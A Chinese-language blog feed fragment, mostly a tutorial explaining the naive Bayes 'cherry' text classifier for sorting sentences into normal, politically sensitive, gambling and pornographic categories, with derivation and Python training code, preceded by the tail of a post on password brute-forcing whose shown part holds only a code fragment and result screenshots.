class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p> 总览<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/14703046762519.png" alt=""></p>
<p>图文分析</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/14703047183607.jpg" alt=""></p>
<p>部分结果一览</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/147030475970560.jpg" alt="147030475970560"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码爆破" scheme="http://www.future-sec.com/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>贝叶斯分类器</title>
    <link href="http://www.future-sec.com/bayesian-classifier.html"/>
    <id>http://www.future-sec.com/bayesian-classifier.html</id>
    <published>2018-04-07T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:11.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>贝叶斯模型在机器学习以及人工智能中都有出现，<a href="https://github.com/Sunkist-Cherry/cherry" rel="external nofollow noopener noreferrer" target="_blank">cherry分类器</a>使用了朴素贝叶斯模型算法，<strong>经过简单的优化，使用1000个训练数据就能得到97.5%的准确率。</strong>虽然现在主流的框架都带有朴素贝叶斯模型算法，大多数开发者只需要直接调用api就能使用。但是在实际业务中，面对不同的数据集，必须了解算法的原理，实现以及懂得对结果进行分析，才能达到高准确率。</p>
<h2 id="cherry分类器"><a href="#cherry分类器" class="headerlink" title="cherry分类器"></a>cherry分类器</h2><p>###基础术语：<br><a href="(https://github.com/Sunkist-Cherry/cherry">cherry分类器</a>)默认支持中英文分类，用作例子的数据缓存中，中文训练数据包含<strong>正常</strong>，<strong>政治敏感</strong>，<strong>赌博</strong>，<strong>色情</strong>4个类别，英文训练数据包含<strong>正常邮件</strong>，<strong>垃圾邮件</strong>两个类别 (训练数据可以通过<a href="https://drive.google.com/file/d/1OtbY7RCjkoQWYb0fHIOTBcJfgDlW5Tjz/view?usp=sharing" rel="external nofollow noopener noreferrer" target="_blank">Google drive</a>下载)。调用非常容易，使用pip安装后，输入句子：</p>
<blockquote>
<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
<blockquote>
<blockquote>
<p>import cherry<br>result = cherry.classify(‘警方召开了全省集中打击赌博违法犯罪活动专项行动电 电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。’)<br>    Building prefix dict from the default dictionary …<br>    Loading model from cache /var/folders/md/0251yy51045d6nknpkbn6dc80000gn/T/jieba.cache<br>    Loading model cost 0.894 seconds.<br>    Prefix dict has been built succesfully.</p>
</blockquote>
</blockquote>
</blockquote>
<p>分类器判断输入句子有99.7%的概率是正常句子，0.2%是政治敏感，剩余0.1%是其他两个类别</p>
<pre><code>&gt;&gt;&gt; result.percentage
[(&apos;normal.dat&apos;, 0.997), (&apos;politics.dat&apos;, 0.002), (&apos;gamble.dat&apos;, 0.0), (&apos;sex.dat&apos;, 0.0)]
</code></pre><p>其中对分类器判断影响最大的词语分别是<strong>赌博</strong>，<strong>活动</strong>，<strong>会议</strong>，<strong>违法犯罪</strong>，<strong>警方</strong>，<strong>打击</strong></p>
<pre><code>&gt;&gt;&gt; result.word_list
[(&apos;赌博&apos;, 8.5881312727226), (&apos;活动&apos;, 6.401543938544878), (&apos;会议&apos;, 6.091963362021649), (&apos;违法犯罪&apos;, 4.234845736802978), (&apos;警方&apos;, 3.536827626008435), (&apos;打击&apos;, 3.2491455535566542), (&apos;行动&apos;, 2.8561029654470476), (&apos;查处&apos;, 2.3860993362013083), (&apos;重点&apos;, 2.126816738271229), (&apos;召开&apos;, 1.8628511924367634), (&apos;专项&apos;, 1.1697040118768172), (&apos;电视电话会议&apos;, 1.1697040118768172), (&apos;全省&apos;, 0.47655683131687354), (&apos;集中&apos;, -0.6220554573512382), (&apos;六合彩&apos;, -2.29603189092291)]
</code></pre><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>要理解分类器的原理，可以先从最简单的分类关键词算法开始，输入句子：</p>
<blockquote>
<p>奖金将在您完成首存后即可存入您的账户。真人荷官，六合彩，赌球欢迎来到全新番摊游戏！</p>
</blockquote>
<p>使用关键字算法，我们可以将<strong>真人荷官</strong>，<strong>六合彩</strong>这两个词语加入赌博类别的黑名单，每个类别都维持对应的黑名单表。当之后需要分类的时候，先判断关键字有没有出现在输入句子中，如果有，则判断为对应的类别。这个方法实现简单，但是缺点也很明显，误判率非常高，例如遇到输入句子：</p>
<blockquote>
<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
</blockquote>
<p>这是一个正常的句子，但是由于包含<strong>六合彩</strong>，<strong>赌球</strong>这两个黑名单词语，关键字算法会误判其为赌博类别，同时，如果一个句子同时包含多个不同类别的黑名单词语，例如<strong>赌博</strong>，<strong>色情</strong>的话，关键字算法也无法判断正确。</p>
<h3 id="贝叶斯模型"><a href="#贝叶斯模型" class="headerlink" title="贝叶斯模型"></a>贝叶斯模型</h3><p>其实关键字算法已经接近贝叶斯模型的原理了，我们再仔细分析下关键字算法。<strong>关键字算法的问题在于只对输入句子中的部分词语进行分析，而没有对输入句子的整体进行分析。而贝叶斯模型会对输入句子的所有有效部分进行分析，通过训练数据计算出每个词语在不同类别下的概率，然后综合得出最有可能的结果。可以说，贝叶斯模型是关键字过滤加上统计学的升级版。</strong></p>
<p>当贝叶斯模型去判断输入句子：<br>​                                                </p>
<blockquote>
<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
</blockquote>
<p>它会综合分析句子中的每个词语：</p>
<pre><code>警方，召开，全省，集中打击，... 六合彩，赌球，赌马，...
</code></pre><p>输入句子虽然包含<strong>六合彩</strong>，<strong>赌球</strong>这些赌博常出现的词语，但是<strong>警方</strong>，<strong>召开</strong>，<strong>集中打击</strong>这几个词代表这个句子极有可能是正常的句子。</p>
<h3 id="数学推导"><a href="#数学推导" class="headerlink" title="数学推导"></a>数学推导</h3><p>贝叶斯模型的数学推导非常简单，强烈建议大家静下心自己推导。</p>
<p>这里为了简单起见，我们只考虑句子是<strong>正常</strong>或者<strong>赌博</strong>两种可能，我们先复习一下概率论的基础表达：</p>
<blockquote>
<p>P(A) -&gt; A事件发生的概率，例如明天天晴的概率</p>
<p>P(A|B) -&gt; 条件概率，B事件发生的前提下A事件发生的概率，例如明天天晴而我又没带伞的概率</p>
<p>P(输入句子) -&gt; 这个句子在训练数据中出现的概率 </p>
<p>P(赌博) -&gt; 赌博类别的句子在训练数据中出现的概率</p>
<p>P(赌博|输入句子) -&gt; 输入句子是赌博类别的概率（也是我们最终要求的值）</p>
<p>P(赌博|输入句子) + P(正常|输入句子) = 100%</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/EngineGirl/enginegirl.github.io/master/images/bayes/bayes.png" alt="Bayes"></p>
<p>上图，中间重叠的部分是赌博和句子同时发生的概率P(赌博，输入句子)，可以看出：</p>
<blockquote>
<p>P(赌博|输入句子) = P(赌博，输入句子) / P(输入句子) (1)</p>
</blockquote>
<p>同理：</p>
<blockquote>
<p>P(输入句子|赌博) = P(赌博，输入句子) / P(赌博) (2)</p>
</blockquote>
<p>把(2)代入(1)得到</p>
<blockquote>
<p>P(赌博|输入句子) = P(输入句子|赌博) * P(赌博) / P(输入句子) (3)</p>
</blockquote>
<p>登登登灯，(3)就是贝叶斯模型定理。没看懂没关系，静下心再看一遍。<strong>要得到最终输入句子是赌博类别的概率P(赌博|输入句子)，需要知道右边3个量的值</strong>：</p>
<ol>
<li><p><strong>P(赌博)</strong></p>
<p> 指训练数据中，赌博类别的句子占训练数据的百分比。</p>
</li>
<li><p><strong>P(输入句子)</strong></p>
<p> 指这个输入句子出现在训练数据中的概率。我们最终目的是判断输入句子是哪个类别的概率比较高，也就是比较P(赌博|输入句子)与P(正常|输入句子)，由贝叶斯定理：</p>
<blockquote>
<p>P(赌博|输入句子) = P(输入句子|赌博) * P(赌博) / P(输入句子) (4)</p>
<p>P(正常|输入句子) = P(输入句子|正常) * P(正常) / P(输入句子) (5)</p>
</blockquote>
<p> 由于(4)，(5)都要除于相同的P(输入句子)，所以(4)，(5)右边可以同时乘以P(句子)，只比较等号右边前两个值的乘积的大小。</p>
<blockquote>
<p>P(赌博|输入句子) = P(输入句子|赌博) <em> P(赌博)<br>P(正常|输入句子) = P(输入句子|正常) </em> P(正常)</p>
</blockquote>
</li>
<li><p><strong>P(句子|赌博)</strong></p>
<p> <strong>最关键的就是求P(输入句子|赌博)</strong>，直接求输入句子在赌博类别句子中出现的概率非常困难，因为训练数据不可能包含所有句子，很可能并没有输入句子。什么意思呢？因为同一个句子，把词语进行不同的排列组合都能成立，例如：</p>
<blockquote>
<p>奖金将在您完成首存后即可存入您的账户。真人荷官，六合彩，赌球欢迎来到全新番摊游戏！</p>
</blockquote>
<p> 可以变成</p>
<blockquote>
<p>奖金将在您完成首存后即可存入您的账户。六合彩，赌球，真人荷官欢迎来到全新番摊游戏！</p>
</blockquote>
<p> 或者</p>
<blockquote>
<p>欢迎来到全新番摊游戏，奖金将在您完成首存后即可存入您的账户。六合彩，真人荷官，赌球！</p>
</blockquote>
<p> 稍微变换词语的位置就是一个新的句子了，训练数据不可能把所有排列组合的句子都加进去，因为实在太多了。<strong>所以当我们遇到一个输入句子，很可能它在训练数据中没有出现，那么P(输入句子|类别)对应的概率都为零，这显然不是真实的结果。也会导致我们的分类器出错</strong>，这个时候该怎么办呢？<strong>刚刚在<a href="#贝叶斯模型">贝叶斯模型</a>中我们提到，它会将一个句子分成不同的词语来综合分析，那我们是不是也可以把句子当成词语的集合呢？</strong></p>
<blockquote>
<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
<p>警方召开了全省…赌马等赌博活动 = 警方 + 召开 + 全省…+赌博活动 </p>
</blockquote>
<p> 即：</p>
<blockquote>
<p>P(输入句子|赌博) = (P(词语1) <em> P(词语2|词语1) </em> P(词语3|词语2))|赌博) ≈ P(词语1)|P(赌博) <em> P(词语2)|P(赌博) </em> P(词语3)|P(赌博)</p>
<p>P(警方召开了全省…赌马等赌博活动。|赌博) = P(警方|赌博) <em> P(召开|赌博) </em> P(全省|赌博) …  <em> P(赌马|赌博) </em> P(赌博活动|赌博)</p>
</blockquote>
<p> 我们把P(输入句子|赌博)分解成所有P(词语|赌博)概率的乘积，然后通过训练数据，计算每个词语在不同类别出现的概率。最终获取的是<strong>输入句子有效词语在不同类别中的概率</strong>。</p>
</li>
</ol>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/QQ%E6%88%AA%E5%9B%BE20180408145057.jpg" alt=""></p>
<p>在上面的例子中，虽然<strong>赌马</strong>，<strong>赌球</strong>，<strong>赌博活动</strong>这几个词是赌博类别的概率很高，但是综合所有词语，分类器判断输入句子有80%的概率是正常句子。<strong>简单来说，要判断句子是某个类别的概率，只需要计算该句子有效部分的词语的在该类别概率的乘积。</strong></p>
<h2 id="贝叶斯模型实现"><a href="#贝叶斯模型实现" class="headerlink" title="贝叶斯模型实现"></a>贝叶斯模型实现</h2><p>要计算每个词语在不同类别下出现的概率，有以下几个步骤：</p>
<ol>
<li>选择训练数据，标记类别</li>
<li>把所有训练数据进行分词，并且组成成一个包含所有词语的词袋集合</li>
<li>把每个训练数据转换成词袋集合长度的向量</li>
<li>利用每个类别的下训练数据，计算词袋集合中每个词语的概率</li>
</ol>
<h3 id="选择训练数据"><a href="#选择训练数据" class="headerlink" title="选择训练数据"></a>选择训练数据</h3><p>训练数据的选择是非常关键的一步，我们可以从网络上搜索符合对应类别的句子，使每个类别的数据各占一半。不过当你理解了贝叶斯模型的原理之后，你会发现一个难题问题，就是如何保持数据的独立分布，例如你选择的训练数据如下：</p>
<ul>
<li><p>赌博类别</p>
<blockquote>
<p>根据您所选择的上述六合彩游戏，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
<p>奖金将在您完成首存后即可存入您的账户。真人荷官 六合彩 欢迎来到全新番摊游戏！</p>
</blockquote>
</li>
<li><p>正常类别</p>
<blockquote>
<p>Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。</p>
<p>理查德·菲利普斯·费曼，美国理论物理学家，量子电动力学创始人之一，纳米技术之父。</p>
</blockquote>
</li>
</ul>
<p>我们可以注意到<strong>六合彩</strong>，<strong>游戏</strong>这两个词语，只在赌博类别的训练数据出现。这两个词语对句子是否是赌博类别会有很大的影响性，<strong>六合彩</strong>对赌博类别确实是重要的判别词，但是<strong>游戏</strong>这个词语本身和赌博没有直接的关系，却被错误划分为赌博类别相关的词语，当之后分类器遇到</p>
<blockquote>
<p>我们提供最新最全大型游戏下载，迷你游戏下载，并提供大量游戏攻略</p>
</blockquote>
<p>会因为里面的<strong>游戏</strong>，将它判断为赌博类别，</p>
<pre><code>&gt;&gt;&gt; result = cherry.classify(&apos;我们提供最新最全大型游戏下载，迷你游戏下载，并提供大量游戏攻略&apos;)
&gt;&gt;&gt; result.percentage
[(&apos;gamble.dat&apos;, 0.793), (&apos;normal.dat&apos;, 0.207)]
&gt;&gt;&gt; result.word_list
[(&apos;游戏&apos;, 1.9388011143762069)]
</code></pre><p>所以，当我们要做一个赌博/正常的分类器，我们需要在正常类别的训练数据添加：</p>
<blockquote>
<p>中国游戏第一门户站,全年365天保持不间断更新,您可以在这里获得专业的游戏新闻资讯,完善的游戏攻略专区</p>
</blockquote>
<p>这样的正常而且带有<strong>游戏</strong>关键字的句子。同时当训练数据过少，输入句子包含了训练数据中并没有c出现过的词语，该词语也会被分类器所忽略。<a href="(https://github.com/Sunkist-Cherry/cherry">cherry分类器</a>)可以通过启用debug模式得到被错误划分的数据以及其权重最高的词语，你可以根据输出的词语来调整训练数据。我们之后可以通过Adaboost算法动态调整每个词语的权重，这个功能我们会在下一个版本推出。 另外一方面，现实生活中，正常的句子比赌博类别的句子出现的概率要多得多，这点我们也可以从训练数据的比例上面体现，适当增加正常类别句子的数量，也可以赋予正常类别句子高权重，不过要小心<a href="https://en.wikipedia.org/wiki/Accuracy_paradox" rel="external nofollow noopener noreferrer" target="_blank">Accuracy_paradox</a>的问题。我们在<a href="#测试">测试</a>的时候，可以根据混淆矩阵以及ROC曲线来分析分类器的效果，再进行数据调整。</p>
<h3 id="词袋集合"><a href="#词袋集合" class="headerlink" title="词袋集合"></a>词袋集合</h3><p>为简单起见，本篇文章只选取4个句子作为训练数据：</p>
<ul>
<li><p>赌博类别：</p>
<blockquote>
<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
<p>奖金将在您完成首存后即可存入您的账户。真人荷官 体育博彩 欢迎来到全新番摊游戏！</p>
</blockquote>
</li>
<li><p>正常类别：</p>
<blockquote>
<p>理查德·菲利普斯·费曼，美国理论物理学家，量子电动力学创始人之一，纳米技术之父。</p>
<p>在公安机关持续不断的打击下，六合彩、私彩赌博活动由最初的公开、半公开状态转入地下。</p>
</blockquote>
</li>
</ul>
<p>要计算每个词语在不同类别下的概率，首先需要一个词袋集合，集合包含了训练数据中所有非重复词语(_vocab_list)，参考函数_get_vocab_list：</p>
<pre><code>def _get_vocab_list(self):
    &apos;&apos;&apos;
    Get a list contain all unique non stop words belongs to train_data
    Set up:
    self.vocab_list:
        [
            &apos;What&apos;, &apos;lovely&apos;, &apos;day&apos;,
            &apos;like&apos;, &apos;gamble&apos;, &apos;love&apos;, &apos;dog&apos;, &apos;sunkist&apos;
        ]
    &apos;&apos;&apos;
    vocab_set = set()
    all_train_data = &apos;&apos;.join([v for _, v in self._train_data])
    token = Token(text=all_train_data, lan=self.lan, split=self.split)
    vocab_set = vocab_set | set(token.tokenizer)
    self._vocab_list = list(vocab_set)
</code></pre><p>默认使用<a href="https://github.com/fxsjy/jieba" rel="external nofollow noopener noreferrer" target="_blank">结巴分词</a>进行中文分词（你可以定制分词函数），例如第一个数据：</p>
<blockquote>
<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
</blockquote>
<p>分词后会得到：</p>
<pre><code>[&apos;根据&apos;, &apos;您&apos;, &apos;所&apos;, &apos;选择&apos;, &apos;的&apos;, &apos;上述&apos;, &apos;礼遇&apos;, &apos;，&apos;, &apos;您&apos;, &apos;必须&apos;, &apos;在&apos;, &apos;娱乐场&apos;, &apos;完成&apos;, &apos;总金额&apos;, &apos;（&apos;, &apos;存款&apos;, &apos;+&apos;, &apos;首存&apos;, &apos;奖金&apos;, &apos;）&apos;, &apos;16&apos;, &apos;倍&apos;, &apos;或&apos;, &apos;15&apos;, &apos;倍&apos;, &apos;流水&apos;, &apos;之后&apos;, &apos;，&apos;, &apos;方可&apos;, &apos;申请&apos;, &apos;提款&apos;, &apos;。&apos;]
</code></pre><p>我们去掉包含在stop_word.dat中的词语，stop_word.dat包含了汉语中的常见的转折词：</p>
<blockquote>
<p>如果，但是，并且，不只…</p>
</blockquote>
<p>这些词语对于我们分类器没有用处，因为任何类别都会出现这些词语。接下来再去掉长度等于1的字，第一个训练数据剩下：</p>
<pre><code>[&apos;选择&apos;, &apos;上述&apos;, &apos;礼遇&apos;, &apos;娱乐场&apos;, &apos;总金额&apos;, &apos;存款&apos;, &apos;首存&apos;, &apos;奖金&apos;, &apos;16&apos;, &apos;15&apos;, &apos;流水&apos;, &apos;申请&apos;, &apos;提款&apos;]
</code></pre><p>遍历4个句子最终得到长度为49的词袋集合(vocab_list)：（这里使用的集合是无序的，所以你得到的结果顺序可能不同）</p>
<pre><code>[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
</code></pre><p>得到词袋之后，再次使用训练数据，并把每个训练数据都转变成一个长度为49的一维向量</p>
<pre><code>def _get_vocab_matrix(self):
    &apos;&apos;&apos;
    Convert strings to vector depends on vocal_list
    &apos;&apos;&apos;
    array_list = []
    for k, data in self._train_data:
        return_vec = np.zeros(len(self._vocab_list))
        token = Token(text=data, lan=self.lan, split=self.split)
        for i in token.tokenizer:
            if i in self._vocab_list:
                return_vec[self._vocab_list.index(i)] += 1
        array_list.append(return_vec)
    self._matrix_lst = array_list
</code></pre><blockquote>
<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
</blockquote>
<p>对应转变成：</p>
<pre><code># 长度为49的一维向量
[1, 0, 0, 0, 1, 0, ..., 1, 0, 1]
</code></pre><p>其中的1分别对应着数据分词后的词语在词袋中出现的次数。接下来将所有训练数据的一维向量组合成列表_matrix_list</p>
<pre><code>[
    [1, 0, 0, 0, 1, 0, ..., 1, 0, 1]
    [0, 1, 1, 0, 0, 0, ..., 0, 0, 0]
    ...
]
</code></pre><p><strong>要计算每个词语在不同类别下的概率，只需要把词语出现的次数除以该类别的所有词语的总数，</strong> <a href="https://github.com/Sunkist-Cherry/cherry" rel="external nofollow noopener noreferrer" target="_blank">cherry分类器</a>出于效率的考虑使用了numpy的矩阵运算。</p>
<pre><code>def _training(self):
    &apos;&apos;&apos;
    Native bayes training
    &apos;&apos;&apos;
    self._ps_vector = []
    # 防止有词语在其他类别训练数据中没有出现过，最后的P(句子|类别)乘积就会为零，所以给每个词语一个初始的非常小的出现概率，设置vector默认值为1，cal对应为2
    # vector: 默认值为1的一维数组
    # cal: 默认的分母，计算该类别所有有效词语的总数
    # num: 计算P(赌博), P(句子)
    vector_list = [{
        &apos;vector&apos;: np.ones(len(self._matrix_lst[0])),
        &apos;cal&apos;: 2.0, &apos;num&apos;: 0.0} for i in range(len(self.CLASSIFY))]
    for k, v in enumerate(self.train_data):
        vector_list[v[0]][&apos;num&apos;] += 1
        # vector加上对应句子的词向量，最后把整个向量除于cal，就得到每个词语在该类别的概率。
        # [1, 0, 0, 0, 1, 0, ..., 1, 0, 1] (根据您所选择的...)
        # [0, 1, 1, 0, 0, 0, ..., 0, 0, 0] (奖金将在您完成...)
        #                   +
        # [1, 1, 1, 1, 1, 1, ..., 1, 1, 1] 
        vector_list[v[0]][&apos;vector&apos;] += self._matrix_lst[k]
        vector_list[v[0]][&apos;cal&apos;] += sum(self._matrix_lst[k])
    for i in range(len(self.CLASSIFY)):
        # 每个词语的概率为[2, 2, 2, 1, 2, 1, ..., 2, 1, 2]/cal
        self._ps_vector.append((
            np.log(vector_list[i][&apos;vector&apos;]/vector_list[i][&apos;cal&apos;]),
            np.log(vector_list[i][&apos;num&apos;]/len(self.train_data))))
</code></pre><p>遍历完所有训练数据之后，会得到两个类别对应的每个词语的概率向量，(为了防止python的小数相乘溢出，这里的概率都是取np.log()对数之后得到的值)：</p>
<pre><code>#赌博
([-2.80336038, -2.80336038, -2.80336038, -3.49650756, -3.49650756,
   -2.80336038, -3.49650756, -2.39789527, -2.80336038, -3.49650756,
   -3.49650756, -3.49650756, -2.80336038, -2.80336038, -3.49650756,
   -3.49650756, -3.49650756, -3.49650756, -2.80336038, -2.80336038,
   -3.49650756, -2.80336038, -3.49650756, -2.80336038, -2.80336038,
   -3.49650756, -2.80336038, -2.80336038, -3.49650756, -2.80336038,
   -2.80336038, -2.39789527, -3.49650756, -3.49650756, -3.49650756,
   -2.80336038, -3.49650756, -3.49650756, -2.80336038, -3.49650756,
   -3.49650756, -2.80336038, -2.80336038, -2.80336038, -3.49650756,
   -2.80336038, -2.80336038, -3.49650756, -2.39789527, -2.80336038,
   -3.49650756, -2.80336038]), 0.5)

# 正常
([-3.25809654, -3.25809654, -3.25809654, -2.56494936, -2.56494936,
   -3.25809654, -2.56494936, -3.25809654, -3.25809654, -2.56494936,
   -2.56494936, -2.56494936, -3.25809654, -3.25809654, -2.56494936,
   -2.56494936, -2.56494936, -2.56494936, -3.25809654, -3.25809654,
   -2.56494936, -3.25809654, -2.56494936, -3.25809654, -3.25809654,
   -2.56494936, -3.25809654, -3.25809654, -2.56494936, -3.25809654,
   -3.25809654, -3.25809654, -2.56494936, -2.56494936, -2.56494936,
   -3.25809654, -2.56494936, -2.56494936, -3.25809654, -2.56494936,
   -2.56494936, -3.25809654, -3.25809654, -3.25809654, -2.56494936,
   -3.25809654, -3.25809654, -2.56494936, -3.25809654, -3.25809654,
   -2.56494936, -3.25809654]), 0.5)

# 词袋集合 
[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
</code></pre><p>结合向量和词袋集合来看，<strong>提款</strong>，<strong>存入</strong>，<strong>游戏</strong>这几个词是赌博的概率要大于正常的概率</p>
<pre><code>#赌博 提款，存入，游戏
[-2.80336038, -2.80336038, -2.80336038]

#正常 提款，存入，游戏
[-3.25809654, -3.25809654, -3.25809654]
</code></pre><p>符合我们的常识，接下来就可以进行输入句子的分类了。</p>
<h3 id="判断类别"><a href="#判断类别" class="headerlink" title="判断类别"></a>判断类别</h3><p>训练完数据，得到词语对应概率之后，判断类别就非常简单，<strong>只需要把输入句子进行相同的分词，然后计算对应的词语对应的概率的乘积即可，</strong>得到乘积最大的就是最有可能的类别。输入句子：<br>​<br>    欢迎参加澳门在线娱乐城，这里有体育，百家乐，六合彩各类精彩游戏。</p>
<p>先根据原先的词袋集合，先转变为一维向量</p>
<pre><code># 词袋集合
[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
# 长度为49的一维向量
[0, 0, 1, 0, 1, ...]
</code></pre><p>然后与分别与两个概率向量相乘，求和，并加上对应的类别占比，对应的代码：</p>
<pre><code>def _bayes_classify(self):
    &apos;&apos;&apos;
    Calculate the probability of different category
    &apos;&apos;&apos;
    possibility_vector = []
    log_list = []
    # self._ps_vector: ([-3.44, -3.56, -2.90], 0.4)
    for i in self._ps_vector:
        # 计算每个词语对应概率的乘积
        final_vector = i[0] * self.word_vec
        # 获取对分类器影响度最大的词语
        word_index = np.nonzero(final_vector)
        non_zero_word = np.array(self._vocab_list)[word_index]
        # non_zero_vector: [-7.3, -8]
        non_zero_vector = final_vector[word_index]
        possibility_vector.append(non_zero_vector)
        log_list.append(sum(final_vector) + i[1])
    possibility_array = np.array(possibility_vector)
    max_val = max(log_list)
    for i, j in enumerate(log_list):
        # 输出最大概率的类别
        if j == max_val:
            max_array = possibility_array[i, :]
            left_array = np.delete(possibility_array, i, 0)
            sub_array = np.zeros(max_array.shape)
            # 通过曼哈顿举例，计算影响度最大的词语
            for k in left_array:
                sub_array += max_array - k
            return self._update_category(log_list), \
                sorted(
                    list(zip(non_zero_word, sub_array)),
                    key=lambda x: x[1], reverse=True)
</code></pre><p>通过计算：</p>
<blockquote>
<p>P(赌博|句子) = sum([0, 0, 1, 0, 1, …] * [-2.80336038, -2.80336038, -2.80336038, …]) + P(赌博) = 0.85</p>
<p>P(正常|句子) = sum([0, 0, 1, 0, 1, …] * [-3.25809654, -3.25809654, -3.25809654, …])+ P(正常) = 0.15</p>
</blockquote>
<p>最终得到P(赌博|句子) &gt; P(正常|句子)，所以分类器判断这个句子是赌博类别。</p>
<pre><code>&gt;&gt;&gt; result = cherry.classify(&apos;欢迎参加澳门在线娱乐城，这里有体育，百家乐，六合彩各类精彩游戏。&apos;)
&gt;&gt;&gt; result.percentage
[(&apos;gamble.dat&apos;, 0.85), (&apos;normal.dat&apos;, 0.15)]
&gt;&gt;&gt; result.word_list
